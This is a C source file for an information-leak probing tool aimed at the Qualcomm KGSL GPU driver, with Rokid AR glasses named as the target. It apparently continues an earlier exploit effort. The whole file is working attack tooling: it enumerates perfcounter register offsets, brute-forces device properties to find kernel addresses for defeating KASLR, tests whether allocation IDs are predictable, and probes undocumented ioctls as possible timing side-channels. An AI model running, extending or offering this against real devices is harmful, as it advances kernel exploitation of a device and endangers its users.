/*
 * KGSL Perfcounter & Property Focused Leak Analysis
 * ==================================================
 *
 * Based on findings from kgsl_advanced_exploit:
 * - 42 perfcounter groups with non-zero offset_hi
 * - Property 0x02 returns GPU memory layout info (0xefff_f000)
 * - IOCTL 0x58 has a counter that increments with input
 *
 * This tool focuses on:
 * 1. Extracting maximum info from perfcounters
 * 2. Property exhaustive enumeration
 * 3. Correlating values for KASLR defeat
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define KGSL_IOC_TYPE 0x09

// Structures
struct kgsl_perfcounter_get
{
    unsigned int groupid;
    unsigned int countable;
    unsigned int offset;
    unsigned int offset_hi;
    unsigned int flags;
};

struct kgsl_perfcounter_put
{
    unsigned int groupid;
    unsigned int countable;
    unsigned int flags;
};

struct kgsl_perfcounter_query
{
    unsigned int groupid;
    unsigned int *countables;
    unsigned int count;
    unsigned int max_counters;
};

struct kgsl_perfcounter_read_group
{
    unsigned int groupid;
    unsigned int countable;
    uint64_t value;
};

struct kgsl_perfcounter_read
{
    struct kgsl_perfcounter_read_group *reads;
    unsigned int count;
};

struct kgsl_device_getproperty
{
    unsigned int type;
    void *value;
    size_t sizebytes;
};

struct kgsl_gpumem_alloc_id
{
    unsigned int id;
    unsigned int flags;
    size_t size;
    size_t mmapsize;
    uint64_t gpuaddr;
};

struct kgsl_gpumem_free_id
{
    unsigned int id;
    unsigned int pad;
};

// IOCTLs
#define IOCTL_KGSL_DEVICE_GETPROPERTY _IOWR(KGSL_IOC_TYPE, 0x02, struct kgsl_device_getproperty)
#define IOCTL_KGSL_GPUMEM_ALLOC_ID _IOWR(KGSL_IOC_TYPE, 0x2F, struct kgsl_gpumem_alloc_id)
#define IOCTL_KGSL_GPUMEM_FREE_ID _IOW(KGSL_IOC_TYPE, 0x30, struct kgsl_gpumem_free_id)
#define IOCTL_KGSL_PERFCOUNTER_GET _IOWR(KGSL_IOC_TYPE, 0x38, struct kgsl_perfcounter_get)
#define IOCTL_KGSL_PERFCOUNTER_PUT _IOW(KGSL_IOC_TYPE, 0x39, struct kgsl_perfcounter_put)
#define IOCTL_KGSL_PERFCOUNTER_QUERY _IOWR(KGSL_IOC_TYPE, 0x3A, struct kgsl_perfcounter_query)
#define IOCTL_KGSL_PERFCOUNTER_READ _IOWR(KGSL_IOC_TYPE, 0x3B, struct kgsl_perfcounter_read)

#define KGSL_MEMALIGN_SHIFT 16

static int kgsl_fd = -1;

void hexdump(const void *data, size_t size)
{
    const unsigned char *p = (const unsigned char *)data;
    for (size_t i = 0; i < size; i++)
    {
        if (i % 16 == 0)
            printf("    %04zx: ", i);
        printf("%02x ", p[i]);
        if ((i + 1) % 16 == 0)
            printf("\n");
    }
    if (size % 16 != 0)
        printf("\n");
}

// ═══════════════════════════════════════════════════════════════════════════
// Comprehensive Perfcounter Analysis
// ═══════════════════════════════════════════════════════════════════════════

void analyze_perfcounter_offsets(void)
{
    printf("\n");
    printf("╔═══════════════════════════════════════════════════════════════════╗\n");
    printf("║  PERFCOUNTER REGISTER OFFSET ANALYSIS                             ║\n");
    printf("╚═══════════════════════════════════════════════════════════════════╝\n\n");

    printf("[*] Theory: offset_hi values are GPU MMIO register offsets\n");
    printf("    These can help determine GPU register base address\n\n");

// Collect all unique offset_hi values
#define MAX_OFFSETS 256
    uint32_t offset_hi_values[MAX_OFFSETS];
    uint32_t offset_lo_values[MAX_OFFSETS];
    int offset_count = 0;

    for (unsigned int g = 0; g < 32; g++)
    {
        // Get max counters for this group
        unsigned int countables[256];
        struct kgsl_perfcounter_query query = {
            .groupid = g,
            .countables = countables,
            .count = 256,
        };

        if (ioctl(kgsl_fd, IOCTL_KGSL_PERFCOUNTER_QUERY, &query) != 0)
            continue;
        if (query.max_counters == 0)
            continue;

        printf("[Group %2u] max_counters=%u, available=%u\n", g, query.max_counters, query.count);

        // Get all available counters
        for (unsigned int c = 0; c < query.max_counters && c < 16; c++)
        {
            struct kgsl_perfcounter_get get = {
                .groupid = g,
                .countable = c,
            };

            if (ioctl(kgsl_fd, IOCTL_KGSL_PERFCOUNTER_GET, &get) != 0)
                continue;

            printf("    Counter %2u: offset=0x%04x, offset_hi=0x%04x\n",
                   c, get.offset, get.offset_hi);

            // Store unique offset_hi values
            int found = 0;
            for (int i = 0; i < offset_count; i++)
            {
                if (offset_hi_values[i] == get.offset_hi)
                {
                    found = 1;
                    break;
                }
            }
            if (!found && offset_count < MAX_OFFSETS)
            {
                offset_hi_values[offset_count] = get.offset_hi;
                offset_lo_values[offset_count] = get.offset;
                offset_count++;
            }

            // Release counter
            struct kgsl_perfcounter_put put = {.groupid = g, .countable = c};
            ioctl(kgsl_fd, IOCTL_KGSL_PERFCOUNTER_PUT, &put);
        }
    }

    printf("\n[*] Summary: Found %d unique offset_hi values\n", offset_count);
    printf("\n[*] Unique offset_hi values (MMIO register offsets):\n");

    // Sort and print
    for (int i = 0; i < offset_count - 1; i++)
    {
        for (int j = i + 1; j < offset_count; j++)
        {
            if (offset_hi_values[i] > offset_hi_values[j])
            {
                uint32_t tmp = offset_hi_values[i];
                offset_hi_values[i] = offset_hi_values[j];
                offset_hi_values[j] = tmp;
                tmp = offset_lo_values[i];
                offset_lo_values[i] = offset_lo_values[j];
                offset_lo_values[j] = tmp;
            }
        }
    }

    for (int i = 0; i < offset_count; i++)
    {
        printf("    0x%04x (lo: 0x%04x)\n", offset_hi_values[i], offset_lo_values[i]);
    }

    // Analyze pattern
    printf("\n[*] Analysis:\n");
    printf("    Base offset_hi: 0x%04x (likely GPU MMIO offset base)\n",
           offset_count > 0 ? offset_hi_values[0] : 0);
    printf("    Max offset_hi:  0x%04x\n",
           offset_count > 0 ? offset_hi_values[offset_count - 1] : 0);
    printf("    Range:          0x%04x bytes\n",
           offset_count > 1 ? offset_hi_values[offset_count - 1] - offset_hi_values[0] : 0);

    // Check if there's a pattern in spacing
    if (offset_count >= 3)
    {
        printf("\n    Spacing analysis:\n");
        for (int i = 0; i < 5 && i < offset_count - 1; i++)
        {
            printf("      0x%04x -> 0x%04x: delta = 0x%04x (%u)\n",
                   offset_hi_values[i], offset_hi_values[i + 1],
                   offset_hi_values[i + 1] - offset_hi_values[i],
                   offset_hi_values[i + 1] - offset_hi_values[i]);
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// Property Exhaustive Enumeration
// ═══════════════════════════════════════════════════════════════════════════

void analyze_properties(void)
{
    printf("\n");
    printf("╔═══════════════════════════════════════════════════════════════════╗\n");
    printf("║  DEVICE PROPERTY EXHAUSTIVE ANALYSIS                              ║\n");
    printf("╚═══════════════════════════════════════════════════════════════════╝\n\n");

    printf("[*] Enumerating all possible property types...\n\n");

    uint8_t buf[512];

    // Known property interpretations
    const char *prop_names[] = {
        [0x01] = "DEVICE_INFO",
        [0x02] = "DEVICE_SHADOW",
        [0x03] = "DEVICE_POWER",
        [0x06] = "MMU_ENABLE",
        [0x07] = "INTERRUPT_WAITS",
        [0x0C] = "VERSION",
        [0x0F] = "GPU_RESET_STAT",
        [0x10] = "PWRCTRL",
        [0x14] = "GPMU_VERSION",
        [0x15] = "UNKNOWN_15",
        [0x16] = "GPU_MODEL",
        [0x17] = "HIGHEST_BANK_BIT",
        [0x18] = "MIN_ACCESS_LENGTH",
        [0x19] = "UBWC_MODE",
        [0x1A] = "DEVICE_BITNESS",
        [0x1B] = "SECURE_CONTEXT_SUPPORT",
        [0x1F] = "SECURE_CTXT",
    };

    for (unsigned int prop = 0x00; prop <= 0x30; prop++)
    {
        memset(buf, 0, sizeof(buf));

        // Try different sizes
        size_t sizes[] = {4, 8, 16, 32, 64, 128, 256, 512};

        for (int s = 0; s < sizeof(sizes) / sizeof(sizes[0]); s++)
        {
            memset(buf, 0, sizeof(buf));

            struct kgsl_device_getproperty getprop = {
                .type = prop,
                .value = buf,
                .sizebytes = sizes[s],
            };

            if (ioctl(kgsl_fd, IOCTL_KGSL_DEVICE_GETPROPERTY, &getprop) == 0)
            {
                // Check if any data returned
                int has_data = 0;
                for (size_t i = 0; i < sizes[s]; i++)
                {
                    if (buf[i] != 0)
                    {
                        has_data = 1;
                        break;
                    }
                }

                if (has_data)
                {
                    const char *name = (prop < sizeof(prop_names) / sizeof(prop_names[0]) && prop_names[prop])
                                           ? prop_names[prop]
                                           : "UNKNOWN";

                    printf("[Property 0x%02x] %s (size=%zu)\n", prop, name, sizes[s]);
                    hexdump(buf, sizes[s] > 64 ? 64 : sizes[s]);

                    // Parse known properties
                    if (prop == 0x01)
                    { // DEVICE_INFO
                        uint32_t *p = (uint32_t *)buf;
                        printf("    Parsed: device_id=%u, chip_id=0x%08x, mmu=%u\n",
                               p[0], p[1], p[2]);
                    }
                    else if (prop == 0x02)
                    { // DEVICE_SHADOW
                        uint64_t *p = (uint64_t *)buf;
                        printf("    Parsed: gpuaddr=0x%llx, memsize=0x%llx, flags=0x%llx\n",
                               (unsigned long long)p[0], (unsigned long long)p[1],
                               (unsigned long long)p[2]);

                        // This might be useful for info leak!
                        if ((p[0] & 0xFFFF000000000000ULL) != 0)
                        {
                            printf("    [!] POTENTIAL KERNEL ADDRESS: 0x%llx\n",
                                   (unsigned long long)p[0]);
                        }
                    }
                    else if (prop == 0x0C)
                    { // VERSION
                        uint32_t *p = (uint32_t *)buf;
                        printf("    Parsed: major=%u, minor=%u, patch=%u\n",
                               p[0], p[1], p[2]);
                    }
                    else if (prop == 0x15)
                    {
                        uint32_t val = *(uint32_t *)buf;
                        printf("    Parsed: value=0x%08x (%u)\n", val, val);
                    }

                    printf("\n");
                }
                break; // Found working size
            }
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// GPU Memory Address Space Analysis
// ═══════════════════════════════════════════════════════════════════════════

void analyze_gpumem_addresses(void)
{
    printf("\n");
    printf("╔═══════════════════════════════════════════════════════════════════╗\n");
    printf("║  GPU MEMORY ADDRESS SPACE ANALYSIS                                ║\n");
    printf("╚═══════════════════════════════════════════════════════════════════╝\n\n");

    printf("[*] Analyzing GPU memory allocation patterns...\n\n");

#define NUM_ALLOCS 32
    unsigned int ids[NUM_ALLOCS];
    uint64_t gpuaddrs[NUM_ALLOCS];
    size_t mmapsizes[NUM_ALLOCS];
    int count = 0;

    // Allocate varying sizes
    size_t sizes[] = {4096, 8192, 16384, 65536, 262144, 1048576, 4194304};

    for (int s = 0; s < sizeof(sizes) / sizeof(sizes[0]) && count < NUM_ALLOCS; s++)
    {
        struct kgsl_gpumem_alloc_id alloc = {
            .flags = (12 << KGSL_MEMALIGN_SHIFT),
            .size = sizes[s],
        };

        if (ioctl(kgsl_fd, IOCTL_KGSL_GPUMEM_ALLOC_ID, &alloc) == 0)
        {
            ids[count] = alloc.id;
            gpuaddrs[count] = alloc.gpuaddr;
            mmapsizes[count] = alloc.mmapsize;

            printf("[Alloc %2d] size=%8zu, id=%5u, gpuaddr=0x%016llx, mmapsize=%zu\n",
                   count, sizes[s], alloc.id, (unsigned long long)alloc.gpuaddr,
                   alloc.mmapsize);

            count++;
        }
    }

    printf("\n[*] Analysis:\n");
    printf("    Total allocations: %d\n", count);

    // Check ID pattern
    if (count >= 2)
    {
        printf("    ID increment: %d (predictable: %s)\n",
               ids[1] - ids[0],
               (ids[1] - ids[0] == 1) ? "YES" : "NO");
    }

    // Check gpuaddr pattern
    int has_gpuaddr = 0;
    for (int i = 0; i < count; i++)
    {
        if (gpuaddrs[i] != 0)
        {
            has_gpuaddr = 1;
            break;
        }
    }
    printf("    gpuaddr assigned: %s\n", has_gpuaddr ? "YES" : "NO (all zeros)");

    if (!has_gpuaddr)
    {
        printf("    [!] GPU addresses not assigned without context!\n");
        printf("        This means we can allocate memory but not get GPU VA\n");
    }

    // Check mmapsize pattern
    printf("\n    mmapsize analysis:\n");
    for (int i = 0; i < count; i++)
    {
        size_t expected = sizes[i < sizeof(sizes) / sizeof(sizes[0]) ? i : sizeof(sizes) / sizeof(sizes[0]) - 1];
        double ratio = (double)mmapsizes[i] / expected;
        printf("      Alloc %d: requested=%8zu, mmapsize=%8zu, ratio=%.2f\n",
               i, expected, mmapsizes[i], ratio);
    }

    // Cleanup
    printf("\n[*] Cleaning up allocations...\n");
    for (int i = 0; i < count; i++)
    {
        struct kgsl_gpumem_free_id req = {.id = ids[i]};
        ioctl(kgsl_fd, IOCTL_KGSL_GPUMEM_FREE_ID, &req);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// IOCTL 0x56/0x58 Deep Analysis
// ═══════════════════════════════════════════════════════════════════════════

void analyze_timeline_ioctls(void)
{
    printf("\n");
    printf("╔═══════════════════════════════════════════════════════════════════╗\n");
    printf("║  IOCTL 0x56/0x58 TIMELINE ANALYSIS                                ║\n");
    printf("╚═══════════════════════════════════════════════════════════════════╝\n\n");

    printf("[*] IOCTL 0x56 appears to be TIMELINE_CREATE\n");
    printf("[*] IOCTL 0x58 appears to be TIMELINE_QUERY\n\n");

    uint8_t buf[128];

    // IOCTL 0x56 analysis
    printf("[IOCTL 0x56 Analysis]\n");

    // Try to understand the structure
    // From previous output: offset 12 = 0x20 (32) constant
    for (int i = 0; i < 16; i++)
    {
        memset(buf, 0, sizeof(buf));
        *(uint32_t *)buf = i; // First field

        unsigned long ioctl_num = _IOWR(KGSL_IOC_TYPE, 0x56, char[64]);
        int ret = ioctl(kgsl_fd, ioctl_num, buf);

        if (ret == 0)
        {
            uint32_t *p = (uint32_t *)buf;
            printf("  Input[0]=%2d: output[0]=0x%08x, [1]=0x%08x, [2]=0x%08x, [3]=0x%08x\n",
                   i, p[0], p[1], p[2], p[3]);
        }
    }

    // IOCTL 0x58 analysis
    printf("\n[IOCTL 0x58 Analysis]\n");

    // This has an incrementing counter at offset 8
    uint32_t prev_counter = 0;
    for (int i = 0; i < 16; i++)
    {
        memset(buf, 0, sizeof(buf));
        *(uint32_t *)buf = i;

        unsigned long ioctl_num = _IOWR(KGSL_IOC_TYPE, 0x58, char[64]);
        int ret = ioctl(kgsl_fd, ioctl_num, buf);

        if (ret == 0)
        {
            uint32_t *p = (uint32_t *)buf;
            printf("  Input[0]=%2d: counter[2]=0x%08x (delta=%d)\n",
                   i, p[2], p[2] - prev_counter);
            prev_counter = p[2];
        }
    }

    printf("\n[*] Observations:\n");
    printf("    - IOCTL 0x56 returns stable value at offset 12 (0x20 = 32)\n");
    printf("    - IOCTL 0x58 has a monotonically increasing counter\n");
    printf("    - This counter could be used for timing side-channels\n");
}

// ═══════════════════════════════════════════════════════════════════════════
// Main
// ═══════════════════════════════════════════════════════════════════════════

int main(int argc, char **argv)
{
    printf("\n");
    printf("╔════════════════════════════════════════════════════════════════════╗\n");
    printf("║  KGSL Information Leak Focused Analysis                            ║\n");
    printf("║  Target: Rokid AR Glasses                                          ║\n");
    printf("╚════════════════════════════════════════════════════════════════════╝\n\n");

    printf("[*] UID=%d, EUID=%d\n", getuid(), geteuid());

    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0)
    {
        printf("[-] Failed to open /dev/kgsl-3d0: %s\n", strerror(errno));
        return 1;
    }
    printf("[+] Opened /dev/kgsl-3d0 (fd=%d)\n", kgsl_fd);

    analyze_perfcounter_offsets();
    analyze_properties();
    analyze_gpumem_addresses();
    analyze_timeline_ioctls();

    close(kgsl_fd);

    printf("\n[*] Analysis complete.\n\n");

    return 0;
}
